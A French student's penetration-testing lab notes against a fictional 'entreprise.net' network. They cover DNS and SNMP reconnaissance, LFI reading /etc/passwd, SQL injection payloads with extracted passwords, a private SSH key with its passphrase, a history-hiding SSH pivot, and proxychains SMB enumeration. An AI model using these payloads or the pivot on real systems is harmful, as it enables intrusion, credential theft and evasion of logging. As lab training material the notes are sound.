@@ -1,0 +1,664 @@
+TP pentest
+
+Q1.
+root@mirror:~# dnsrecon -d entreprise.net -t brt -D /usr/share/dnsenum/dns.txt
+[*] Performing host and subdomain brute force against entreprise.net
+[*] 	 A backup.entreprise.net 192.168.1.14
+[*] 	 A ftp.entreprise.net 35.35.35.29
+[*] 	 A mail.entreprise.net 35.35.35.44
+[*] 	 A ns1.entreprise.net 10.0.0.24
+[*] 	 A www.entreprise.net 35.35.35.1
+[+] 5 Records Found
+
+Q2.
+root@mirror:~# dnsrecon -d entreprise.net -t std -D /usr/share/dnsenum/dns.txt
+[*] Performing General Enumeration of Domain:
+[*] Checking for Zone Transfer for entreprise.net name servers
+[*] Resolving SOA Record
+[+] 	 SOA ns1.entreprise.net 10.0.0.24
+[*] Resolving NS Records
+[*] NS Servers found:
+[*] 	NS ns1.entreprise.net 10.0.0.24
+[*] Removing any duplicate NS server IP Addresses...
+[*]
+[*] Trying NS server 10.0.0.24
+[+] 10.0.0.24 Has port 53 TCP Open
+[-] Zone Transfer Failed!
+[-]
+[*] Checking for Zone Transfer for entreprise.net name servers
+[*] Resolving SOA Record
+[+] 	 SOA ns1.entreprise.net 10.0.0.24
+[*] Resolving NS Records
+[*] NS Servers found:
+[*] 	NS ns1.entreprise.net 10.0.0.24
+[*] Removing any duplicate NS server IP Addresses...
+[*]
+[*] Trying NS server 10.0.0.24
+[+] 10.0.0.24 Has port 53 TCP Open
+[-] Zone Transfer Failed!
+[-]
+[-] DNSSEC is not configured for entreprise.net
+[*] 	 SOA ns1.entreprise.net 10.0.0.24
+[*] 	 NS ns1.entreprise.net 10.0.0.24
+[*] 	 MX mail.entreprise.net 35.35.35.44
+[*] 	 A entreprise.net 24.24.24.15
+[*] Enumerating SRV Records
+[*] 	 SRV _http._tcp.entreprise.net www.entreprise.net 35.35.35.1 80 0
+[*] 	 SRV _ldap._tcp.dc._msdcs.entreprise.net entreprise.net 24.24.24.15 389 0
+[+] 2 Records Found
+
+On trouve le serveur MX dans le message :
+[*] 	 MX mail.entreprise.net 35.35.35.44
+
+Q3.
+root@mirror:~# dnsrecon -d entreprise.net -r 35.35.35.0/24 -D /usr/share/dnsenum/dns.txt
+[*] Reverse Look-up of a Range
+[*] Performing Reverse Lookup from 35.35.35.0 to 35.35.35.255
+[*] 	 PTR www.entreprise.net 35.35.35.1
+[*] 	 PTR oldserver.entreprise.net 35.35.35.21
+[*] 	 PTR ftp.entreprise.net 35.35.35.29
+[*] 	 PTR zeus.entreprise.net 35.35.35.42
+[*] 	 PTR mail.entreprise.net 35.35.35.44
+[*] 	 PTR router3.local.lan 35.35.35.254
+[+] 6 Records Found
+
+Q11.
+root@mirror:~# nmap -sU -p 53,67,68,111,123,161,162,500,514,1194,1646,1812,1813,4500 -n 40.0.0.4
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-13 15:56 CEST
+Nmap scan report for 40.0.0.4
+Host is up (0.0037s latency).
+
+PORT     STATE         SERVICE
+53/udp   open|filtered domain
+67/udp   open|filtered dhcps
+68/udp   open|filtered dhcpc
+111/udp  open|filtered rpcbind
+123/udp  open|filtered ntp
+161/udp  open          snmp
+162/udp  open|filtered snmptrap
+500/udp  open|filtered isakmp
+514/udp  open|filtered syslog
+1194/udp open|filtered openvpn
+1646/udp open|filtered radacct
+1812/udp open|filtered radius
+1813/udp open|filtered radacct
+4500/udp open|filtered nat-t-ike
+
+Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds
+
+Q13.
+snmpwalk -Os -c public -v 2c 40.0.0.4 (3679 lignes)
+snmpwalk -Os -c public -v 2c 40.0.0.4 1.3.6 (5737 lignes)
+
+--------------------------------------------------------------------------------
+TP2
+
+Q17.
+http://www.entreprise.net/test_lrfi.php?foo=/etc/passwd
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+
+Q18.
+http://www.entreprise.net/test_lrfi.php?foo=/var/www/html/info.php
+
+Q19.
+Server API 	Apache 2.0 Handler
+PHP API 	20151012
+
+Q20.
+login=admin' or 'a'='a' limit 1 offset 4#;&mdp=&validation=
+
+Récupère les 4 logins dans la base : pierrot, phil, simon, olivier
+
+login=' and 'a'='b' union select 1,mdp,3,4 from coeur where login='pierrot'#;
+
+Récupère les 4 passwords dans la base : kffTFDFSdfzer, dddjjjfffkkkrrr, tDDMMPP_, kdjfhGGGdf3423
+
+challenge1 :
+1st = kgjDVFGjkertj
+2nd = FJDKVVVddjfjerERSd
+
+challenge2 :
+'/**/and/**/1=0/**/union/**/select/**/1,mdp,3,4/**/from/**/coeur/**/where/**/login='guillaume
+ksjdifkejr3
+
+login = guillaume
+password = ksjdifkejr3
+
+tarifs.php
+annee=2014 union select 1,table_name,3,4 from `information_schema`.`tables`
+
+coeur
+challenge
+tarif
+visites
+columns_priv
+db
+
+annee=2014 union select 1,nom,date,4 from visites
+
+john  2014-08-07
+willy 2014-09-16 !!!!!!!!!!!!!!!!
+david 2014-05-12
+max   2014-05-19
+
+User :
+challenge3@%
+
+Q22. www-data
+
+webshell:
+  md5 = a29014565bc6b652ec46f5da3c804f7f
+
+site/.htpasswd:
+admin:7YuBn1CR1qlxI
+
+/etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
+
+/home/user/.ssh/authorized_keys :
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDeSMnK/mx064y4sp5+kdYmsD1sziUmRhPiBvMqhCrCdhTZC0d6si/ZP6mSDhd4Iz0mhE+5GjgpxPHDnH/qzuGl9xCsdSTf09pRwF1ugIifNzytOYNTv3w6dpqrfknYDsL7dm45m+hdAFvKwpD40C68sZmbtXTKhyPnCcnJoYP56scoW3i2LFMms4tLGqwUTxR3PjerzYjuQHOlN/D6c9UBLwCaTpyYzGd3zCCmYYT+eXrVInNBQRKmUr2K13Ltxp88qg9QwEkNZi/RNXSMrxXBXOMIPnmnx65g6MSOhstK0WITVhC2+NOQhv6wlzFE/FadVpntIT5udp8F8l3JH1jZ victor@zeus
+
+/home/user/ssh.tar:
+password.txt -->
+coucou
+
+id_rsa -->
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,4CED81F40CC70B41A2FA26448BA2FCDA
+
+xqem7XDkMR2Lp7QN50WnJKcoK6EnchTSsPYskUtBUIuvOQbYi0EiXlUOrRltCsho
+L2f5B/0yVwHt+XjNRsKrtY77y6z9y7p+hNjAaMGxVvJbTmD0BbcAWp5tvsXqvDs2
+B+gcJ/ghtACYFxBNoFn4/Dyofb15aeUZEOX2u7XTkbW/blltI21psnszIEEC1lWg
+Uj+0mgZEOMI8sWGs+Kw6WhoMNAhPsgjo9gHLM8W5Q3l7R0LV0mLNmlnZ3Gh0F8Xv
+V/qCsHLYL24G+tR4aUfimqnY+ZMpmwnHeY/8Ukihk/H/9g6LJVyNKzhVNqR0Obvr
+V3xzS2dwWMLXn2lQ1YH2zwrF3X2Lx0tQzP2h3Ds4dCbMKU4EPhPcBUmdPBByUtfN
+0Za6n1z8G6a7C3Ygas8bUU0NuSefZigQSB1G9rXIOXBuPvBkqNG/S+aZXqM/AnRe
+sdMsWfYOA6+mE2Lz1PrfeXDQfx1f2LgIYe7Rg5aQVRE0FWXZV+eyH6T65JJOHz5u
+Zfl6H5jx3OnErP79lq7gx27ZDBcBJA7RZP6n2mNeySxZBSwWvxYm1To+jir9CauY
+dChLgGcaPoFo4a21LFff6rQ7uDDB0sDzFeVVZeq85c3y/+fXoCVgAUarPVfluVhD
+X6Kd7qkVI8AoNRxrUygrYfXdaMu4sYQpCChAGuQmLHDS92rda9XIxvDuQyqOWUeW
+DpvGcvx3Z2JVqJ6N9TVb1YiDOQG1yDga6YyvM7hMh1YyAOwy0q633dGH3xlIIiI3
+F2GtvG4gueqQz30B2fqRQuxPyXv2iH5ofT4fSOU4k+Wvynrvl+JKzDFBJSUIivGN
+2ieaGKvKQexsduuusAB968bIwtqNO+VrtNs061BMzDXCT8LyV7kSaNyC7O5siMA4
+lFHiN2ZpvjUGK8VM6nx47Gc2lRi2Up+VrrrNNnP3OPT2/Nx6P3ATasojUw+LGuJB
+g9l3KBySVlh6fIuoQoUd4B2N3AqY0nVOiW3K7Pyv7jLiVqfLt2W4V/0Il2bUWJ/B
+eZkLKTQ9/a3VdFmxaFHfrv9OMAqsRzXrZHL/x0oXvWp/xAN5gzN8+iDweviqAvmh
+BiQYdVLLv9jhwnNy9H5pi+M5MWJyW/n2V+ge0C5XIpX/xrQ+lkFWLLWgr0kZI/5E
+GUUkd91uIJ35tZ1itZoXkWiOPmX4Ir+1KNtfGEpaLUfVl/uPqa0HAg87IO9bVPHn
+jOkveaixMKXWEkWhvme4sDvhO+1epBCJECJ0Nu68cKfyRpb4d+iYJq2M5cCQlyf2
+jeGAFNgUeRAZgwRe1rELUEn53ymXYo/1xyq5dKvzdVUNWcpICdLv51vkZ5yiUmJD
+QP4zp4pT5D0252XX7BgxrZt+/18QeJ+MujcuMvaZ/4EkVRN1ghAIaE8MtCeWEjUf
+nYDX/wcAR+Gy50eZjjbd0Hvxj2JNLyOwy8KCq1Gfc/1k67dSQeWYF2ADhqpTx8Pa
+ya5l9iIrPIbvuriOoAPArZevibg68oOY20WhqKvBAAyU/IhM55LvIACUDK1rE+6U
+JyIbI0Q8XQtt7+soeY4jxHnWai+1ye+dlGE61YudovAxafSuIIdGa3CXznc0v/ny
+-----END RSA PRIVATE KEY-----
+
+--------------------------------------------------------------------------------
+zeus.entreprise.net:22
+
+ssh -D 1080 -i id_rsa victor@zeus.entreprise.net bash -i
+		--> emprunte clé Chiffrement Com
+invite de cmd (/bin/bash)(/etc/passwd)
+unset HISTFILE
+Socks --> Serveur SSH
+
+proxychains
+
+--> proxy depuis machine ssh pour bypass le firewall
+
+/etc/proxychains.conf
+
+Voir ip machine ssh (192.168.0.42/24)
+
+
+Q27. mdp de la clé : coucou
+Q28. chmod 400
+Q29. ssh -D 9050 -i id_rsa victor@zeus.entreprise.net bash -i
+------------------------------------------------------------
+Connexion SSH :
+
+root@mirror:~/M2/MOPS# ssh -D 9050 -i id_rsa victor@zeus.entreprise.net bash -i
+Enter passphrase for key 'id_rsa':
+victor@SSH:~$ unset HISTFILE
+unset HISTFILE
+victor@SSH:~$ ifconfig
+ens160    Link encap:Ethernet  HWaddr 00:0c:29:6e:df:6a
+          inet addr:192.168.0.42  Bcast:192.168.0.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1916 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1437 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:232649 (232.6 KB)  TX bytes:285965 (285.9 KB)
+
+victor@SSH:~$ route -n
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         192.168.0.1     0.0.0.0         UG    0      0        0 ens160
+192.168.0.0     0.0.0.0         255.255.255.0   U     0      0        0 ens160
+
+
+victor@SSH:~$ w
+ 15:26:35 up  1:28, 15 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+victor   pts/0    10.0.0.2         14:42   41:30   0.04s  0.04s -bash
+victor   pts/1    10.0.0.2         14:42    1:31   0.28s  0.00s ping -c1 192.168.0.32
+victor   pts/2    10.0.0.2         14:45   40:49   0.04s  0.04s -bash
+victor   pts/3    10.0.0.2         14:42    1:15   0.22s  0.22s -bash
+victor   pts/4    10.0.0.2         14:50   51.00s  0.96s  0.00s ping -c1 192.168.0.19
+victor   pts/5    10.0.0.2         14:56   59.00s  0.38s  0.00s ping -c 1 192.168.0.22
+victor   pts/6    10.0.0.2         15:01   43.00s  0.12s  0.00s ping -c1 192.168.0.16
+victor   pts/7    10.0.0.2         15:01    3:15   0.20s  0.20s -bash
+victor   pts/8    10.0.0.2         14:52    3:14   0.29s  0.29s -bash
+victor   pts/9    10.0.0.2         14:51   19.00s  0.05s  0.05s -bash
+victor   pts/10   10.0.0.2         15:04    1:44   0.06s  0.06s -bash
+victor   pts/11   10.0.0.2         15:10    4:02   0.04s  0.04s -bash
+victor   pts/12   10.0.0.2         15:12   17.00s  0.12s  0.00s man find
+victor   pts/13   10.0.0.2         15:25    3.00s  0.06s  0.06s -bash
+victor   pts/14   10.0.0.2         15:25    0.00s  0.04s  0.00s w
+
+victor@SSH:~$ more /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+victor:x:1001:1001::/home/victor:/bin/bash
+
+victor@SSH:~$ lastlog
+Username         Port     From             Latest
+root                                       **Never logged in**
+daemon                                     **Never logged in**
+bin                                        **Never logged in**
+sys                                        **Never logged in**
+sync                                       **Never logged in**
+games                                      **Never logged in**
+man                                        **Never logged in**
+lp                                         **Never logged in**
+mail                                       **Never logged in**
+news                                       **Never logged in**
+uucp                                       **Never logged in**
+proxy                                      **Never logged in**
+www-data                                   **Never logged in**
+backup                                     **Never logged in**
+list                                       **Never logged in**
+irc                                        **Never logged in**
+gnats                                      **Never logged in**
+nobody                                     **Never logged in**
+systemd-timesync                           **Never logged in**
+systemd-network                            **Never logged in**
+systemd-resolve                            **Never logged in**
+systemd-bus-proxy                           **Never logged in**
+syslog                                     **Never logged in**
+_apt                                       **Never logged in**
+messagebus                                 **Never logged in**
+uuidd                                      **Never logged in**
+sshd                                       **Never logged in**
+user             tty1                      Tue Oct 24 14:04:28 +0200 2017
+victor           pts/14   10.0.0.2         Tue Oct 24 15:25:51 +0200 2017
+
+victor@SSH:~$ ps -fed
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 13:57 ?        00:00:01 /sbin/init splash
+root         2     0  0 13:57 ?        00:00:00 [kthreadd]
+root         3     2  0 13:57 ?        00:00:00 [ksoftirqd/0]
+root         5     2  0 13:57 ?        00:00:00 [kworker/0:0H]
+root         7     2  0 13:57 ?        00:00:00 [rcu_sched]
+root         8     2  0 13:57 ?        00:00:00 [rcu_bh]
+root         9     2  0 13:57 ?        00:00:00 [migration/0]
+root        10     2  0 13:57 ?        00:00:00 [watchdog/0]
+root        11     2  0 13:57 ?        00:00:00 [kdevtmpfs]
+root        12     2  0 13:57 ?        00:00:00 [netns]
+root        13     2  0 13:57 ?        00:00:00 [perf]
+root        14     2  0 13:57 ?        00:00:00 [khungtaskd]
+root        15     2  0 13:57 ?        00:00:00 [writeback]
+root        16     2  0 13:57 ?        00:00:00 [ksmd]
+root        17     2  0 13:57 ?        00:00:00 [crypto]
+root        18     2  0 13:57 ?        00:00:00 [kintegrityd]
+root        19     2  0 13:57 ?        00:00:00 [bioset]
+root        20     2  0 13:57 ?        00:00:00 [kblockd]
+root        21     2  0 13:57 ?        00:00:00 [ata_sff]
+root        22     2  0 13:57 ?        00:00:00 [md]
+root        23     2  0 13:57 ?        00:00:00 [devfreq_wq]
+root        27     2  0 13:57 ?        00:00:00 [kswapd0]
+root        28     2  0 13:57 ?        00:00:00 [vmstat]
+root        29     2  0 13:57 ?        00:00:00 [fsnotify_mark]
+root        30     2  0 13:57 ?        00:00:00 [ecryptfs-kthrea]
+root        46     2  0 13:57 ?        00:00:00 [kthrotld]
+root        47     2  0 13:57 ?        00:00:00 [acpi_thermal_pm]
+root        48     2  0 13:57 ?        00:00:00 [bioset]
+root        49     2  0 13:57 ?        00:00:00 [bioset]
+root        50     2  0 13:57 ?        00:00:00 [bioset]
+root        51     2  0 13:57 ?        00:00:00 [bioset]
+root        52     2  0 13:57 ?        00:00:00 [bioset]
+root        53     2  0 13:57 ?        00:00:00 [bioset]
+root        54     2  0 13:57 ?        00:00:00 [bioset]
+root        55     2  0 13:57 ?        00:00:00 [bioset]
+root        56     2  0 13:57 ?        00:00:00 [bioset]
+root        57     2  0 13:57 ?        00:00:00 [bioset]
+root        58     2  0 13:57 ?        00:00:00 [bioset]
+root        59     2  0 13:57 ?        00:00:00 [bioset]
+root        60     2  0 13:57 ?        00:00:00 [bioset]
+root        61     2  0 13:57 ?        00:00:00 [bioset]
+root        62     2  0 13:57 ?        00:00:00 [bioset]
+root        63     2  0 13:57 ?        00:00:00 [bioset]
+root        64     2  0 13:57 ?        00:00:00 [bioset]
+root        65     2  0 13:57 ?        00:00:00 [bioset]
+root        66     2  0 13:57 ?        00:00:00 [bioset]
+root        67     2  0 13:57 ?        00:00:00 [bioset]
+root        68     2  0 13:57 ?        00:00:00 [bioset]
+root        69     2  0 13:57 ?        00:00:00 [bioset]
+root        70     2  0 13:57 ?        00:00:00 [bioset]
+root        71     2  0 13:57 ?        00:00:00 [bioset]
+root        72     2  0 13:57 ?        00:00:00 [scsi_eh_0]
+root        73     2  0 13:57 ?        00:00:00 [scsi_tmf_0]
+root        74     2  0 13:57 ?        00:00:00 [scsi_eh_1]
+root        75     2  0 13:57 ?        00:00:00 [scsi_tmf_1]
+root        80     2  0 13:57 ?        00:00:00 [ipv6_addrconf]
+root        96     2  0 13:57 ?        00:00:00 [deferwq]
+root        97     2  0 13:57 ?        00:00:00 [charger_manager]
+root       505     2  0 13:57 ?        00:00:00 [mpt_poll_0]
+root       513     2  0 13:57 ?        00:00:00 [mpt/0]
+root       659     2  0 13:57 ?        00:00:00 [kpsmoused]
+root       697     2  0 13:57 ?        00:00:00 [scsi_eh_2]
+root       698     2  0 13:57 ?        00:00:00 [scsi_tmf_2]
+root       832     2  0 13:57 ?        00:00:00 [bioset]
+root       833     2  0 13:57 ?        00:00:00 [ttm_swap]
+root       984     2  0 13:57 ?        00:00:00 [jbd2/sda1-8]
+root       985     2  0 13:57 ?        00:00:00 [ext4-rsv-conver]
+root      1018     1  0 13:57 ?        00:00:01 /lib/systemd/systemd-journald
+root      1022     2  0 13:57 ?        00:00:00 [kworker/0:1H]
+root      1033     2  0 13:57 ?        00:00:00 [kauditd]
+root      1076     1  0 13:57 ?        00:00:00 /lib/systemd/systemd-udevd
+systemd+  1207     1  0 13:57 ?        00:00:00 /lib/systemd/systemd-timesyncd
+root      2030     1  0 13:57 ?        00:00:00 /lib/systemd/systemd-logind
+root      2046     1  0 13:57 ?        00:00:00 /usr/sbin/cron -f
+root      2051     1  0 13:57 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
+syslog    2058     1  0 13:57 ?        00:00:00 /usr/sbin/rsyslogd -n
+message+  2061     1  0 13:57 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+root      2610     1  0 13:58 ?        00:00:00 /usr/sbin/sshd -D
+root      2707     1  0 14:04 tty2     00:00:00 /sbin/agetty --noclear tty2 linux
+root      2766     1  0 14:04 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
+victor    2875     1  0 14:26 ?        00:00:00 /lib/systemd/systemd --user
+victor    2878  2875  0 14:26 ?        00:00:00 (sd-pam)
+root      3017     2  0 14:36 ?        00:00:00 [kworker/u2:2]
+root      3206  2610  0 14:42 ?        00:00:00 sshd: victor [priv]
+root      3208  2610  0 14:42 ?        00:00:00 sshd: victor [priv]
+victor    3226  3208  0 14:42 ?        00:00:00 sshd: victor@pts/1
+victor    3227  3226  0 14:42 pts/1    00:00:00 -bash
+victor    3259  3206  0 14:42 ?        00:00:00 sshd: victor@pts/0
+victor    3260  3259  0 14:42 pts/0    00:00:00 -bash
+root      3310  2610  0 14:42 ?        00:00:00 sshd: victor [priv]
+root      3312  2610  0 14:42 ?        00:00:00 sshd: victor [priv]
+victor    3330  3312  0 14:42 ?        00:00:00 sshd: victor@notty
+victor    3331  3330  0 14:42 ?        00:00:00 bash -i
+victor    3357  3310  0 14:42 ?        00:00:00 sshd: victor@pts/3
+victor    3358  3357  0 14:42 pts/3    00:00:00 -bash
+root      3545     2  0 14:44 ?        00:00:00 [kworker/u2:1]
+root      3574  2610  0 14:45 ?        00:00:00 sshd: victor [priv]
+victor    3593  3574  0 14:45 ?        00:00:00 sshd: victor@pts/2
+victor    3594  3593  0 14:45 pts/2    00:00:00 -bash
+root      3808  2610  0 14:50 ?        00:00:00 sshd: victor [priv]
+victor    3827  3808  0 14:50 ?        00:00:00 sshd: victor@pts/4
+victor    3828  3827  0 14:50 pts/4    00:00:00 -bash
+root      3913  2610  0 14:51 ?        00:00:00 sshd: victor [priv]
+victor    3931  3913  0 14:51 ?        00:00:00 sshd: victor@pts/9
+victor    3932  3931  0 14:51 pts/9    00:00:00 -bash
+root      3955  2610  0 14:52 ?        00:00:00 sshd: victor [priv]
+victor    3973  3955  0 14:52 ?        00:00:00 sshd: victor@pts/8
+victor    3974  3973  0 14:52 pts/8    00:00:00 -bash
+root      4009     2  0 14:55 ?        00:00:00 [kworker/0:1]
+root      4055  2610  0 14:56 ?        00:00:00 sshd: victor [priv]
+victor    4076  4055  0 14:56 ?        00:00:00 sshd: victor@pts/5
+victor    4077  4076  0 14:56 pts/5    00:00:00 -bash
+root      4272  2610  0 15:01 ?        00:00:00 sshd: victor [priv]
+victor    4291  4272  0 15:01 ?        00:00:00 sshd: victor@pts/6
+victor    4292  4291  0 15:01 pts/6    00:00:00 -bash
+root      4304  2610  0 15:01 ?        00:00:00 sshd: victor [priv]
+victor    4322  4304  0 15:01 ?        00:00:00 sshd: victor@pts/7
+victor    4323  4322  0 15:01 pts/7    00:00:00 -bash
+root      4464  2610  0 15:04 ?        00:00:00 sshd: victor [priv]
+victor    4491  4464  0 15:04 ?        00:00:00 sshd: victor@pts/10
+victor    4492  4491  0 15:04 pts/10   00:00:00 -bash
+root      4926  2610  0 15:10 ?        00:00:00 sshd: victor [priv]
+victor    4986  4926  0 15:10 ?        00:00:00 sshd: victor@pts/11
+victor    4988  4986  0 15:10 pts/11   00:00:00 -bash
+root      5083  2610  0 15:12 ?        00:00:00 sshd: victor [priv]
+victor    5168  5083  0 15:12 ?        00:00:00 sshd: victor@pts/12
+victor    5169  5168  0 15:12 pts/12   00:00:00 -bash
+root      6036     2  0 15:22 ?        00:00:00 [kworker/0:2]
+root      6161  2610  0 15:24 ?        00:00:00 sshd: victor [priv]
+victor    6180  6161  0 15:24 ?        00:00:00 sshd: victor@notty
+victor    6181  6180  0 15:24 ?        00:00:00 bash -i
+root      6191     2  0 15:24 ?        00:00:00 [kworker/u2:0]
+victor    6223     1  0 15:24 ?        00:00:00 bash -i
+root      6258  2610  0 15:25 ?        00:00:00 sshd: victor [priv]
+victor    6276  6258  0 15:25 ?        00:00:00 sshd: victor@pts/13
+victor    6277  6276  0 15:25 pts/13   00:00:00 -bash
+victor    6368  6223  0 15:25 ?        00:00:00 arp
+root      6379  2610  0 15:25 ?        00:00:00 sshd: victor [priv]
+victor    6402  6379  0 15:25 ?        00:00:00 sshd: victor@pts/14
+victor    6404  6402  0 15:25 pts/14   00:00:00 -bash
+victor    6618  5169  0 15:27 pts/12   00:00:00 less
+victor    6749  4292  0 15:28 pts/6    00:00:00 ping -c1 192.168.0.50
+victor    6753  3227  0 15:28 pts/1    00:00:00 ping -c1 192.168.0.65
+victor    6783  4077  0 15:28 pts/5    00:00:00 ping -c 1 192.168.0.59
+victor    6796  6404  0 15:28 pts/14   00:00:00 ps -fed
+
+victor@SSH:~$ more /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	SSH
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+victor@SSH:~$ more /etc/hostname
+SSH
+
+victor@SSH:~$ netstat -antpl
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 192.168.0.42:22         10.0.0.2:35596          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:52056          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:49572          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:60028          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:37938          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:52786          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:51849          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:50896          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:47164          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:60278          ESTABLISHED -
+tcp        0      0 127.0.0.1:22            127.0.0.1:42460         ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:59666          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:44554          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:41268          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:60528          ESTABLISHED -
+tcp        0      0 127.0.0.1:42460         127.0.0.1:22            ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:60292          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:52408          ESTABLISHED -
+tcp        0      0 192.168.0.42:22         10.0.0.2:39468          ESTABLISHED -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+
+--------------------------------------------------------------------------------------------------------
+
+192.168.0.1 --> X (route -n sur zeus)
+192.168.0.10 -> 80/tcp
+192.168.0.20 -> 21,25,110,1027,445,...
+192.168.0.42 -> zeus
+
+192.168.1.1 --> X
+192.168.1.2 --> icmp
+192.168.1.11
+    //
+192.168.1.26
+
+24.24.24.1 ---> X
+24.24.24.15 --> X
+
+root@mirror:~/M2/MOPS# proxychains smbclient -L \\\\192.168.1.21 -U %
+ProxyChains-3.1 (http://proxychains.sf.net)
+WARNING: The "syslog" option is deprecated
+|S-chain|-<>-127.0.0.1:9050-<><>-192.168.1.21:445-<><>-OK
+Domain=[ENTREPRISE] OS=[Windows 7 Ultimate 7601 Service Pack 1] Server=[Windows 7 Ultimate 6.1]
+
+Machine 192.168.1.17 !!!!!!!!!!!!
+
